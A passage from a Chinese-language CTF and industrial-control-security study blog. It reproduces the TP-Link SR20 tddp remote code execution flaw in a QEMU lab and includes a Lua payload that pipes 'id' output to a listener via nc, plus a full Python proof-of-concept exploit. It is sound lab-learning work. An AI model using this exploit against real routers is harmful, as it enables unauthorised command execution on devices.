<a href=#%e4%be%8b%e9%a2%984-%e6%9e%a2%e7%bd%91%e6%99%ba%e7%9b%be2021%e5%b7%a5%e6%8e%a7%e5%8d%8f%e8%ae%ae%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>(_ws.col.protocol == &#34;S7COMM&#34;) &amp;&amp; (frame.number == 418)</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/01ebd40/imgs/image-20240430135813366.png alt=/posts/01ebd40/imgs/image-20240430135813366.png height=1600 width=2560>
然后直接把明文传输的数据 base64 解码即可
<img loading=lazy src=/posts/01ebd40/imgs/image-20240430135958048.png alt=/posts/01ebd40/imgs/image-20240430135958048.png height=1225 width=2292>
flag{hncome66!}</p><h2 class=heading-element id=web渗透类><span>Web渗透类</span>
<a href=#web%e6%b8%97%e9%80%8f%e7%b1%bb class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h2 class=heading-element id=逆向分析><span>逆向分析</span>
<a href=#%e9%80%86%e5%90%91%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=tp-link-sr20-本地网络远程代码执行漏洞><span>TP-Link SR20 本地网络远程代码执行漏洞</span>
<a href=#tp-link-sr20-%e6%9c%ac%e5%9c%b0%e7%bd%91%e7%bb%9c%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>固件下载链接：https://www.tp-link.com/us/support/download/sr20/#Firmware</p><p>选择 <code>SR20(US)_V1_180518</code> 下载，然后解压，直接使用 binwalk 提取固件即可</p><p>搭建 arm qemu 虚拟机环境</p><p>搭建环境前需要先获取以下三个文件，并置于统一目录中，下载链接：https://people.debian.org/~aurel32/qemu/armhf/</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>debian_wheezy_armhf_standard.qcow2 <span class=c1># qemu虚拟机的硬盘镜像文件，包含完整的 Debian Wheezy 操作系统（ARM 架构）</span>
</span></span><span class=line><span class=cl>initrd.img-3.2.0-4-vexpress <span class=c1># 初始 RAM 文件系统镜像，用于在内核加载时提供临时文件系统和驱动</span>
</span></span><span class=line><span class=cl>vmlinuz-3.2.0-4-vexpress <span class=c1># 压缩的 Linux 内核镜像文件，控制系统硬件和资源管理</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo tunctl -t tap0 -u <span class=sb>`</span>whoami<span class=sb>`</span>  
</span></span><span class=line><span class=cl><span class=c1># 为了与 QEMU 虚拟机通信，添加一个虚拟网卡，如果显示已经分配给一个用户，要先用以下命令启用</span>
</span></span><span class=line><span class=cl><span class=c1># sudo ip link set tap0 up</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 为添加的虚拟网卡配置 IP 地址</span>
</span></span><span class=line><span class=cl>sudo ifconfig tap0 10.10.10.1/24 
</span></span><span class=line><span class=cl><span class=c1># 根据配置启动虚拟机</span>
</span></span><span class=line><span class=cl>qemu-system-arm <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    -M vexpress-a9 <span class=se>\ </span>                            <span class=c1># 使用 ARM 虚拟平台 vexpress-a9</span>
</span></span><span class=line><span class=cl>    -kernel vmlinuz-3.2.0-4-vexpress <span class=se>\ </span>          <span class=c1># 指定内核镜像文件</span>
</span></span><span class=line><span class=cl>    -initrd initrd.img-3.2.0-4-vexpress <span class=se>\ </span>       <span class=c1># 指定 initrd 初始 RAM 文件系统</span>
</span></span><span class=line><span class=cl>    -drive <span class=k>if</span><span class=o>=</span>sd,file<span class=o>=</span>debian_wheezy_armhf_standard.qcow2 <span class=se>\ </span> <span class=c1># 将 debian 磁盘镜像作为 SD 卡</span>
</span></span><span class=line><span class=cl>    -append <span class=s2>&#34;root=/dev/mmcblk0p2 console=ttyAMA0&#34;</span> <span class=se>\ </span><span class=c1># 内核启动参数：设置根分区及控制台</span>
</span></span><span class=line><span class=cl>    -net nic <span class=se>\ </span>                                  <span class=c1># 启用虚拟网络接口</span>
</span></span><span class=line><span class=cl>    -net tap,ifname<span class=o>=</span>tap0,script<span class=o>=</span>no,downscript<span class=o>=</span>no <span class=se>\ </span><span class=c1># 使用 tap0 进行网络桥接</span>
</span></span><span class=line><span class=cl>    -nographic                                    <span class=c1># 不启动图形界面，重定向到终端</span></span></span></code></pre></td></tr></table></div></div><p>虚拟机成功运行后，使用 root root 默认密码登录系统，然后使用以下命令配置网卡，建立与宿主机的通讯</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ifconfig eth0 10.10.10.2/24</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/01ebd40/imgs/image-20241025160447046.png alt=/posts/01ebd40/imgs/image-20241025160447046.png height=628 width=1115></p><p>建立好通讯后，用以下命令把固件中的文件系统传入虚拟机中并解压</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>tar -cjpf squashfs-root.tar.bz2 squashfs-root/
</span></span><span class=line><span class=cl>python -m http.server
</span></span><span class=line><span class=cl>wget http://10.10.10.1:8000/squashfs-root.tar.bz2
</span></span><span class=line><span class=cl>tar -xjpf squashfs-root.tar.bz2</span></span></code></pre></td></tr></table></div></div><p>然后需要在宿主机中安装TFTP服务</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo apt install atftpd</span></span></code></pre></td></tr></table></div></div><p>编辑 <code>/etc/default/atftpd</code> 文件，<code>USE_INETD=true</code> 改为 <code>USE_INETD=false</code></p><p>修改 <code>/srv/tftp</code> 为 <code>/tftpboot</code></p><p>修改完成后用以下命令启动并查看aftpd服务</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo systemctl start atftp
</span></span><span class=line><span class=cl>sudo systemctl status atftp
</span></span><span class=line><span class=cl><span class=c1># 如果出现 atftpd: can&#39;t bind port :69/udp 报错</span>
</span></span><span class=line><span class=cl><span class=c1># 需要先用以下命令停用 inetutils-inetd 服务，然后再restart</span>
</span></span><span class=line><span class=cl>sudo systemctl stop inetutils-inetd.service</span></span></code></pre></td></tr></table></div></div><p>下图是启动成功的界面
<img loading=lazy src=/posts/01ebd40/imgs/image-20241025162544581.png alt=/posts/01ebd40/imgs/image-20241025162544581.png height=390 width=1115></p><p>之后是漏洞复现的步骤
现在宿主机的<code>/tftpboot</code> 目录下创建下面两个文件</p><p>文件一：payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=k>function</span> config_test<span class=o>(</span>config<span class=o>)</span>
</span></span><span class=line><span class=cl>  os.execute<span class=o>(</span><span class=s2>&#34;id | nc 10.10.10.1 1337&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>end</span></span></code></pre></td></tr></table></div></div><p>文件二：poc.py</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Copyright 2019 Google LLC.</span>
</span></span><span class=line><span class=cl><span class=c1># SPDX-License-Identifier: Apache-2.0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Create a file in your tftp directory with the following contents:</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#function config_test(config)</span>
</span></span><span class=line><span class=cl><span class=c1>#  os.execute(&#34;telnetd -l /bin/login.sh&#34;)</span>
</span></span><span class=line><span class=cl><span class=c1>#end</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Execute script as poc.py remoteaddr filename</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>binascii</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>port_send</span> <span class=o>=</span> <span class=mi>1040</span>
</span></span><span class=line><span class=cl><span class=n>port_receive</span> <span class=o>=</span> <span class=mi>61000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>tddp_ver</span> <span class=o>=</span> <span class=s2>&#34;01&#34;</span>
</span></span><span class=line><span class=cl><span class=n>tddp_command</span> <span class=o>=</span> <span class=s2>&#34;31&#34;</span>
</span></span><span class=line><span class=cl><span class=n>tddp_req</span> <span class=o>=</span> <span class=s2>&#34;01&#34;</span>
</span></span><span class=line><span class=cl><span class=n>tddp_reply</span> <span class=o>=</span> <span class=s2>&#34;00&#34;</span>
</span></span><span class=line><span class=cl><span class=n>tddp_padding</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>%0.16X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=mi>00</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>tddp_packet</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=n>tddp_ver</span><span class=p>,</span> <span class=n>tddp_command</span><span class=p>,</span> <span class=n>tddp_req</span><span class=p>,</span> <span class=n>tddp_reply</span><span class=p>,</span> <span class=n>tddp_padding</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sock_receive</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_DGRAM</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sock_receive</span><span class=o>.</span><span class=n>bind</span><span class=p>((</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=n>port_receive</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Send a request</span>
</span></span><span class=line><span class=cl><span class=n>sock_send</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_DGRAM</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>packet</span> <span class=o>=</span> <span class=n>binascii</span><span class=o>.</span><span class=n>unhexlify</span><span class=p>(</span><span class=n>tddp_packet</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>argument</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>%s</span><span class=s2>;arbitrary&#34;</span> <span class=o>%</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>packet</span> <span class=o>=</span> <span class=n>packet</span> <span class=o>+</span> <span class=n>argument</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>sock_send</span><span class=o>.</span><span class=n>sendto</span><span class=p>(</span><span class=n>packet</span><span class=p>,</span> <span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>port_send</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sock_send</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>response</span><span class=p>,</span> <span class=n>addr</span> <span class=o>=</span> <span class=n>sock_receive</span><span class=o>.</span><span class=n>recvfrom</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>response</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;hex&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>然后虚拟机运行tddp，宿主机开启监听并运行poc.py即可成功复现</p><p><img loading=lazy src=/posts/01ebd40/imgs/image-20241025173411193.png alt=/posts/01ebd40/imgs/image-20241025173411193.png height=207 width=1676></p><p><img loading=lazy src=/posts/01ebd40/imgs/image-20241025173312434.png alt=/posts/01ebd40/imgs/image-20241025173312434.png height=107 width=1115></p><p>但是我这里虚拟机中tddp的动态链接库有点问题，暂时卡在这里了</p><p><img loading=lazy src=/posts/01ebd40/imgs/image-20241025172358445.png alt=/posts/01ebd40/imgs/image-20241025172358445.png height=217 width=1115></p><p>参考链接：https://paper.seebug.org/879/</p><h2 class=heading-element id=工控编程与组态分析><span>工控编程与组态分析</span>
<a href=#%e5%b7%a5%e6%8e%a7%e7%bc%96%e7%a8%8b%e4%b8%8e%e7%bb%84%e6%80%81%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>需要用到的软件：</p><ol><li>McgsPro</li><li>组态王</li><li>西门子-博图软件</li><li>STEP7 MicroWIN V4.0 SP9</li></ol><p>软件下载及安装</p><blockquote><p>SIMATIC STEP 7 incl. Safety and WinCC V16 TRIAL Download:</p><p><a href="https://support.industry.siemens.com/cs/document/109772803/simatic-step-7-incl-safety-and-wincc-v16-trial-download?dti=0&amp;lc=en-CN" target=_blank rel="external nofollow noopener noreferrer">https://support.industry.siemens.com/cs/document/109772803/simatic-step-7-incl-safety-and-wincc-v16-trial-download?dti=0&lc=en-CN</a></p><p>西门子TIA 博途V16安装详解及授权：</p><p><a href=https://blog.csdn.net/shmp54/article/details/136840560 target=_blank rel="external nofollow noopener noreferrer">https://blog.csdn.net/shmp54/article/details/136840560</a></p><p>西门子博途V16安装全网最详解教程：</p><p><a href=https://zhuanlan.zhihu.com/p/304315391 target=_blank rel="external nofollow noopener noreferrer">https://zhuanlan.zhihu.com/p/304315391</a></p></blockquote></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span title="更新于 2025-10-23 17:18:16">更新于 2025-10-23&nbsp;</span></div></div><div class=post-info-line><div class=post-info-md><span><a href=/posts/01ebd40/index.md title=阅读原始文档 class=link-to-markdown>阅读原始文档</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="分享到 X" data-sharer=twitter data-url=https://goodlunatic.github.io/posts/01ebd40/ data-title="CTF-ICS Learning Record" data-hashtags=CTF><i class="fa-brands fa-x-twitter fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); title="分享到 Facebook" data-sharer=facebook data-url=https://goodlunatic.github.io/posts/01ebd40/ data-hashtag=CTF><i class="fa-brands fa-facebook-square fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); title="分享到 微博" data-sharer=weibo data-url=https://goodlunatic.github.io/posts/01ebd40/ data-title="CTF-ICS Learning Record"><i class="fa-brands fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fa-solid fa-tags fa-fw me-1" aria-hidden=true></i><a href=/tags/ctf/ class=post-tag title="标签 - CTF">CTF</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/posts/848cf69/ class=post-nav-item rel=prev title="IOT Security Research"><i class="fa-solid fa-angle-left fa-fw" aria-hidden=true></i>IOT Security Research</a><a href=/posts/69280be/ class=post-nav-item rel=next title="2024 某金融系统内部赛 Misc Writeup">2024 某金融系统内部赛 Misc Writeup<i class="fa-solid fa-angle-right fa-fw" aria-hidden=true></i></a></div></div><div id=comments><div id=giscus class=comment><script src=https://giscus.app/client.js data-repo=goodlunatic/goodlunatic.github.io data-repo-id=R_kgDOQHqgBw data-category=Announcements data-category-id=DIC_kwDOQHqgB84Cw_4D data-mapping=pathname data-strict=0 data-theme=preferred_color_scheme data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-lang=zh-CN data-loading=lazy crossorigin=anonymous async defer></script></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://giscus.app/ rel="external nofollow noopener noreferrer">giscus</a>.</noscript></div></article><aside class=toc id=toc-auto aria-label=目录><h2 class=toc-title>目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden=true></i></h2><div class=toc-content id=toc-content-auto></div></aside></main><footer class=footer><div class=footer-container><div class="footer-line powered order-1">由 <a href=https://gohugo.io/ target=_blank rel="external nofollow noopener noreferrer" title="Hugo 0.152.1">Hugo</a> 强力驱动 | 主题 - <a href=https://github.com/hugo-fixit/FixIt target=_blank rel=external title="FixIt v0.4.0-alpha.2-20251023040336-063af2cd">FixIt</a></div><div class="footer-line copyright order-2" itemscope itemtype=http://schema.org/CreativeWork><i class="fa-regular fa-copyright fa-fw" aria-hidden=true></i>
<span itemprop=copyrightYear>2022 - 2025</span><span class=author itemprop=copyrightHolder>
<a href=https://goodlunatic.github.io target=_blank rel="external nofollow noopener noreferrer">Lunatic</a></span></div><div class="footer-line visitor"><span id=busuanzi_container_site_uv title=总访客数><i class="fa-regular fa-user fa-fw me-1" aria-hidden=true></i><span id=busuanzi_value_site_uv><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden=true></i></span></span><span id=busuanzi_container_site_pv class=footer-divider title=总访问量><i class="fa-regular fa-eye fa-fw me-1" aria-hidden=true></i><span id=busuanzi_value_site_pv><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden=true></i></span></span></div></div></footer></div><div class=widgets><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role=button aria-label=回到顶部><i class="fa-solid fa-arrow-up fa-fw" aria-hidden=true></i><span class=variant-numeric>0%</span></div><div class="fixed-button view-comments d-none" role=button aria-label=查看评论><i class="fa-solid fa-comment fa-fw" aria-hidden=true></i></div></div><a href=https://github.com/goodlunatic title="Visit Lunatic's Github" target=_blank rel="external nofollow" class="github-corner left d-none-mobile"><svg viewBox="0 0 250 250" aria-hidden="true" width="56" height="56"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentColor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentColor" class="octo-body"/></svg></a><div id=mask></div><noscript><div class=noscript-warning>该网站在启用 JavaScript 的情况下效果最佳。</div></noscript></div><link rel=stylesheet href=/lib/pace/themes/blue/pace-theme-minimal.css><script src=/lib/autocomplete/autocomplete.min.js defer></script><script src=/lib/fuse/fuse.min.js defer></script><script src=/lib/sharer/sharer.min.js async defer></script><script src=/lib/cell-watermark/watermark.min.js defer></script><script src=https://vercount.one/js async defer></script><script src=/lib/pace/pace.min.js async defer></script><script src=/posts/01ebd40/config/page.js defer></script><script src=/js/theme.min.js defer></script></body></html>